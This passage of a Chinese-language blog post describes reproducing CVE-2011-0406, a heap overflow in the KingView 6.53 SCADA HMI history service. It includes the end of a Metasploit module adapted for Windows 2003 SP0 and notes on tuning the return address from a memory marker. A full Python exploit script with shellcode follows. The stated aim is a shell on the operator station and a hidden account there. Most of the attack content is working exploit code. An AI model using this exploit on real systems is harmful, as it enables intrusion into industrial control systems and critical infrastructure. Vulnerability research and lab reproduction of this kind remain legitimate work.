class="line">			<span class="comment">#not ready to implement</span></span><br><span class="line">			<span class="comment">#sploit &lt;&lt; rand_text_alpha_upper(32776-sploit.length)</span></span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">'V'</span>)</span><br><span class="line">		<span class="keyword">elsif</span> target.name =~ <span class="regexp">/2003 SP0/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">1020</span>)</span><br><span class="line">			sploit &lt;&lt; <span class="string">"ABCA"</span></span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">"\x44"</span>*(<span class="number">31752</span>-payload.encoded.length)</span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">		connect</span><br><span class="line"></span><br><span class="line">		print_status(<span class="string">"Trying target <span class="subst">#{target.name}</span>"</span>)</span><br><span class="line">		sock.write(sploit)</span><br><span class="line"></span><br><span class="line">		select(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">5</span>)</span><br><span class="line">		handler</span><br><span class="line">		disconnect</span><br><span class="line"></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></tbody></table></figure>
<p>​        进入msf，重新 reaload module，可以看到新加入的目标代码已经加载。</p>
<p><img alt="截屏2019-10-15下午7.06.12" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z80ro7apj31g30sue82.jpg" data-index="8" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z80ro7apj31g30sue82.jpg"></p>
<p>​        这里注意，一定要更换攻击方式，由原来的1变为2.</p>
<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set target <span class="number">2</span></span><br></pre></td></tr></tbody></table></figure>
<p><img alt="截屏2019-10-15下午8.04.47" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z82ue9dhj31g30suqv5.jpg" data-index="9" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z82ue9dhj31g30suqv5.jpg"></p>
<p>​        再次攻击后，在memory中查找定位字符串位置 ABCA，如下图所示。（图中为我第一次设置的标志值ABCD，方法相同）</p>
<p><img alt="截屏2019-10-15下午7.29.11" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z846kebnj31g30suwht.jpg" data-index="10" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z846kebnj31g30suwht.jpg"></p>
<p>​        可以看到“ABCA”字符串在地址 0x00CD04C0 位置，并且䏰ᰡyload需要在此基础上加4个字节，其实位置在 0x00CD04C4。</p>
<p><img alt="截屏2019-10-15下午8.08.37" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z8551rqjj31g30su0w1.jpg" data-index="11" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z8551rqjj31g30su0w1.jpg"></p>
<p>​        需根据上步骤定位出的 shellcode 位置来调整 Ret 的值，使得 eax + 0xC 指向输入数据包中的某个 4 字节数据。定位字符“ABCA”位 置是 0x00CD04C0，减去 0xC 得到 eax 寄存器的值为 0x00CD04C4，所以 Ret 的值为 0x00CD04C4。修改后的利用程序代码如下所示:</p>
<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elsif</span> target.name =~ <span class="regexp">/2003 SP0/</span></span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		sploit &lt;&lt; make_nops(<span class="number">1020</span>)</span><br><span class="line">		sploit &lt;&lt; <span class="string">"\xC4\x04\xB4\x00"</span></span><br><span class="line">		sploit &lt;&lt; payload.encoded</span><br><span class="line">		sploit &lt;&lt; <span class="string">"\x44"</span>*(<span class="number">31752</span>-payload.encoded.length)</span><br><span class="line">		sploit &lt;&lt; [target.ret].pack(<span class="string">'V'</span>)</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></tbody></table></figure>
<p>​        再次利用可成功通过漏洞获取系统权限。</p>
<p><img alt="截屏2019-10-15下午8.31.37" class="post-img b-lazy" data-img="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z89ajgtjj31g30su4qq.jpg" data-index="12" data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z89ajgtjj31g30su4qq.jpg"></p>
<h2 id="预期结果"><a href="#预期结果" class="headerlink" title="预期结果"></a><strong>预期结果</strong></h2><p>​        成功获取win 2003 操作员站的shell，并可以在操作员站建立隐蔽账号。</p>
<h2 id="PLUS"><a href="#PLUS" class="headerlink" title="PLUS"></a>PLUS</h2><p>​        尝试通过Python脚本的方式进行 EXP 编写进行手工测试。</p>
<p>​        下面给出一个参考：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Exploit Title: KingView 6.53 SCADA HMI Heap Overflow PoC</span></span><br><span class="line"><span class="comment">## Date: 9/28/2010</span></span><br><span class="line"><span class="comment">## Author: Dillon Beresford</span></span><br><span class="line"><span class="comment">## Software Link: http://download.kingview.com/software/kingview%20English%20Version/kingview6.53_EN.rar</span></span><br><span class="line"><span class="comment">## Version: 6.53 (English)</span></span><br><span class="line"><span class="comment">## Tested on: Windows XP SP1 ( works on SP2 and SP3 ) will release new targets after CERT advisory is public. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Shouts to HD Moore JDuck, Egyp7, todb, |)ruid, nate and the rest of the AHA! crew.</span></span><br><span class="line"><span class="comment">## Thanks to all who share knowledge about heap smashing and heap bypass techniques.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Notified CERT and the vendor, CERT notified the vendor as well, vendor never responded.</span></span><br><span class="line"><span class="comment">## No patch or response from vendor as of 1/9/2011</span></span><br><span class="line"><span class="comment">## Lets get this into the wild and see how long it takes them to respond.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Looks like persistence pays off. :-)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## SP2/SP3 targets will be available soon. (putting into metasploit this is just a poc to get response from vendor).</span></span><br><span class="line"><span class="comment">## Vendor: Beijing WellinControl Technology Development Co.,Ltd </span></span><br><span class="line"><span class="comment">## http://www.wellintek.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Beijing WellinControl Technology Development and CHINA CERT were notified on Tue, Sep 28, 2010 at 6:31 AM</span></span><br><span class="line"><span class="comment">## I have made every attempt and yet they choose to ignore...</span></span><br><span class="line"><span class="comment">## This PoC should wake up the dragon. &gt;:-]</span></span><br><span class="line"><span class="comment">## With more to come!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## KingView software is a high-pormance production which can be used to building a data information </span></span><br><span class="line"><span class="comment">## service platform in automatic field. KingView software can provid graphic visualization which takes </span></span><br><span class="line"><span class="comment">## your operations management, control and optimization . KingView is widely used in power, </span></span><br><span class="line"><span class="comment">## water conservancy,buildings, coalmine, environmental protection, metallurgy and so on. </span></span><br><span class="line"><span class="comment">## And now KingView software is used in national defense, Aero-Space in China. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Notes: The HistorySrv process listens on TCP port 777 </span></span><br><span class="line"><span class="comment">## This process does not require any authentication from clients</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## An attacker could replace the Flink and Blink pointers with evil ones.. Herrow srweeping dragon. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Windows XP SP1 (x86) </span></span><br><span class="line"><span class="comment">## CommandLine: "C:\Program Files\Kingview\HistorySvr.exe"</span></span><br><span class="line"><span class="comment">## eax=00241eb4 ebx=7ffdf000 ecx=00000003 edx=77f6eb08 esi=00241eb4 edi=00241f48</span></span><br><span class="line"><span class="comment">## eip=77f767cd esp=0012fb38 ebp=0012fc2c iopl=0         nv up ei pl nz na po nc</span></span><br><span class="line"><span class="comment">## cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span></span><br><span class="line"><span class="comment">## ntdll!DbgBreakPoint:</span></span><br><span class="line"><span class="comment">## 77f767cd cc              int     3</span></span><br><span class="line"><span class="comment">## 0:000&gt; g</span></span><br><span class="line"><span class="comment">## ModLoad: 71950000 71a34000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.10.0_x-ww_f7fb5805\comctl32.dll</span></span><br><span class="line"><span class="comment">## ModLoad: 5ad70000 5ada4000   C:\WINDOWS\System32\uxtheme.dll</span></span><br><span class="line"><span class="comment">## ModLoad: 71a50000 71a8b000   C:\WINDOWS\system32\mswsock.dll</span></span><br><span class="line"><span class="comment">## ModLoad: 71a90000 71a98000   C:\WINDOWS\System32\wshtcpip.dll</span></span><br><span class="line"><span class="comment">## (318.6d4): Access violation - code c0000005 (first chance)</span></span><br><span class="line"><span class="comment">## First chance exceptions are reported before any exception handling.</span></span><br><span class="line"><span class="comment">## This exception may be expected and handled.</span></span><br><span class="line"><span class="comment">## eax=42424242 ebx=00000285 ecx=44444444 edx=00d38110 esi=00d38110 edi=003a0000</span></span><br><span class="line"><span class="comment">## eip=77f6256f esp=0012f36c ebp=0012f584 iopl=0         nv up ei pl zr na pe nc</span></span><br><span class="line"><span class="comment">## cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010246</span></span><br><span class="line"><span class="comment">## ntdll!RtlAllocateHeapSlowly+0x6bd:</span></span><br><span class="line"><span class="comment">## 77f6256f 8901            mov     dword ptr [ecx],eax  ds:0023:44444444=????????</span></span><br><span class="line"><span class="comment">## 0:000&gt; u</span></span><br><span class="line"><span class="comment">## ntdll!RtlAllocateHeapSlowly+0x6bd:</span></span><br><span class="line"><span class="comment">## 77f6256f 8901            mov     dword ptr [ecx],eax</span></span><br><span class="line"><span class="comment">## 77f62571 894804          mov     dword ptr [eax+4],ecx</span></span><br><span class="line"><span class="comment">## 77f62574 3bc1            cmp     eax,ecx</span></span><br><span class="line"><span class="comment">## 77f62576 7534            jne     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)</span></span><br><span class="line"><span class="comment">## 77f62578 668b06          mov     ax,word ptr [esi]</span></span><br><span class="line"><span class="comment">## 77f6257b 663d8000        cmp     ax,80h</span></span><br><span class="line"><span class="comment">## 77f6257f 732b            jae     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)</span></span><br><span class="line"><span class="comment">## 77f62581 0fb7c8          movzx   ecx,ax</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## usage python exploit.py 127.0.0.1 777</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">" KingView 6.53 SCADA HMI Heap Smashing Exploit "</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">" Credits: D1N | twitter.com/D1N "</span></span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">"\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"</span></span><br><span class="line"><span class="string">"\x44\x80\xc2\x77"</span> </span><br><span class="line"><span class="string">"\xFF\xD1\x90\x90"</span>) </span><br><span class="line"></span><br><span class="line">exploit = (<span class="string">"\x90"</span> * <span class="number">1024</span> + <span class="string">"\x44"</span> * <span class="number">31788</span>) </span><br><span class="line">exploit += (<span class="string">"\xeb\x14"</span>) <span class="comment"># our JMP (over the junk and into nops) </span></span><br><span class="line">exploit += (<span class="string">"\x44"</span> * <span class="number">6</span>) </span><br><span class="line">exploit += (<span class="string">"\xad\xbb\xc3\x77"</span>) <span class="comment"># ECX 0x77C3BBAD --&gt; call dword ptr ds:[EDI+74] </span></span><br><span class="line">exploit += (<span class="string">"\xb4\x73\xed\x77"</span>) <span class="comment"># EAX 0x77ED73B4 --&gt; UnhandledExceptionFilter() </span></span><br><span class="line">exploit += (<span class="string">"\x90"</span> * <span class="number">21</span>) </span><br><span class="line">exploit += shellcode</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"  [+] Herrow Sweeping Dragon..."</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"  [+] Sending payload..."</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">s.connect((host,port)) </span><br><span class="line">s.send(exploit)  </span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"  [+] Closing connection.."</span> </span><br><span class="line">s.close()  </span><br><span class="line"><span class="built_in">print</span> <span class="string">"  [+] Done!"</span> </span><br></pre></td></tr></tbody></table></figure>

                </article>
                <ul class="tags-postTags">
                    
                    <li>
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
                    </li>
                    
                </ul>
            </div>
        </div>
    </div>

    
    <nav id="gobottom" class="pagination">
        
        <a class="prev-post" title="常见二进制逆向工具总结" href="/2019/10/26/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/">
            ← 常见二进制逆向工具总结
        </a>
        
        <span class="prev-next-post">·</span>
        
    </nav>

    
    <div class="inner">
        <div id="comment"></div>
    </div>
    
</div>

<div class="toc-bar">
    <div class="toc-btn-bar">
        <a href="#site-main" class="toc-btn">
            <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M793.024 710.272a32 32 0 1 0 45.952-44.544l-310.304-320a32 32 0 0 0-46.4 0.48l-297.696 320a32 32 0 0 0 46.848 43.584l274.752-295.328 286.848 295.808z"></path></svg>
        </a>
        <div class="toc-btn toc-switch">
            <svg class="toc-open" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M779.776 480h-387.2a32 32 0 0 0 0 64h387.2a32 32 0 0 0 0-64M779.776 672h-387.2a32 32 0 0 0 0 64h387.2a32 32 0 0 0 0-64M256 288a32 32 0 1 0 0 64 32 32 0 0 0 0-64M392.576 352h387.2a32 32 0 0 0 0-64h-387.2a32 32 0 0 0 0 64M256 480a32 32 0 1 0 0 64 32 32 0 0 0 0-64M256 672a32 32 0 1 0 0 64 32 32 0 0 0 0-64"></path></svg>
            <svg class="toc-close hide" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M512 960c-247.039484 0-448-200.960516-448-448S264.960516 64 512 64 960 264.960516 960 512 759.039484 960 512 960zM512 128.287273c-211.584464 0-383.712727 172.128262-383.712727 383.712727 0 211.551781 172.128262 383.712727 383.712727 383.712727 211.551781 0 383.712727-172.159226 383.712727-383.712727C895.712727 300.415536 723.551781 128.287273 512 128.287273z"></path><path d="M557.05545 513.376159l138.367639-136.864185c12.576374-12.416396 12.672705-32.671738 0.25631-45.248112s-32.704421-12.672705-45.248112-0.25631l-138.560301 137.024163-136.447897-136.864185c-12.512727-12.512727-32.735385-12.576374-45.248112-0.063647-12.512727 12.480043-12.54369 32.735385-0.063647 45.248112l136.255235 136.671523-137.376804 135.904314c-12.576374 12.447359-12.672705 32.671738-0.25631 45.248112 6.271845 6.335493 14.496116 9.504099 22.751351 9.504099 8.12794 0 16.25588-3.103239 22.496761-9.247789l137.567746-136.064292 138.687596 139.136568c6.240882 6.271845 14.432469 9.407768 22.65674 9.407768 8.191587 0 16.352211-3.135923 22.591372-9.34412 12.512727-12.480043 12.54369-32.704421 0.063647-45.248112L557.05545 513.376159z"></path></svg>
        </div>
        <a href="#gobottom" class="toc-btn">
            <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M231.424 346.208a32 32 0 0 0-46.848 43.584l297.696 320a32 32 0 0 0 46.4 0.48l310.304-320a32 32 0 1 0-45.952-44.544l-286.848 295.808-274.752-295.36z"></path></svg>
        </a>
    </div>
    <div class="toc-main">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%80%81%E7%8E%8B-KingView"><span class="toc-text">组态王 KingView</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2011-0406"><span class="toc-text">CVE-2011-0406</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-text">实验步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%87%86%E5%A4%87"><span class="toc-text">实验准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%B0%9D%E8%AF%95"><span class="toc-text">攻击尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">分析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-text">修改利用代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E7%BB%93%E6%9E%9C"><span class="toc-text">预期结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PLUS"><span class="toc-text">PLUS</span></a></li></ol>
    </div>
</div>



<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>




	</div>
	


	




<div id="search" class="search-overlay">
    <div class="search-form">
        
        <div class="search-overlay-logo">
        	<img src="https://i.loli.net/2017/11/26/5a19c0b50432e.png" alt="Fstark">
        </div>
        
        <input id="local-search-input" class="search-input" type="text" name="search" placeholder="搜索 ...">
        <a class="search-overlay-close" href="#"></a>
    </div>
    <div id="local-search-result"></div>
</div>

<footer class="site-footer outer">
	<div class="site-footer-content inner">
		<div class="copyright">
			<a href="/" title="Fstark">Fstark © 2021</a>
			
				
			        <span hidden="true" id="/2019/10/20/%EF%BC%88%E5%B7%A5%E6%8E%A7%E5%90%91%EF%BC%89%E7%BB%84%E6%80%81%E7%8E%8B%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8/" class="leancloud-visitors" data-flag-title="（工控向）组态王软件漏洞测试验证与利用">
			            <span>阅读量 </span>
			            <span class="leancloud-visitors-count">0</span>
			        </span>
	    		
    		
		</div>
		<nav class="site-footer-nav">
			
			<a href="https://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
			<a href="https://github.com/xzhih/hexo-theme-casper" title="Casper" target="_blank" rel="noopener">Casper</a>
		</nav>
	</div>
</footer>
	


<script>
    if(window.navigator && navigator.serviceWorker) {
        navigator.serviceWorker.getRegistrations().then(function(registrations) {
            for(let registration of registrations) {
                registration.unregister()
            }
        })
    }
</script>


<script id="scriptLoad" src="/js/allinone.min.js" async=""></script>


<script>
    document.getElementById('scriptLoad').addEventListener('load', function () {
        
        
            var bLazy = new Blazy();
        

        
        

        
        
        
            searchFunc("/");
        
        
    })
</script>




<link rel="stylesheet" href="/photoswipe/photoswipe.css">


<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>


<script src="/photoswipe/photoswipe-ui-default.min.js"></script>





<script id="valineScript" src="//unpkg.com/valine/dist/Valine.min.js" async=""></script>
<script>
    document.getElementById('valineScript').addEventListener("load", function() {
        new Valine({
            el: '#comment' ,
            verify: false,
            notify: false,
            appId: '',
            appKey: '',
            placeholder: 'Just go go',
            pageSize: 10,
            avatar: 'mm',
            visitor: true
        })
    });
</script>







</body></html>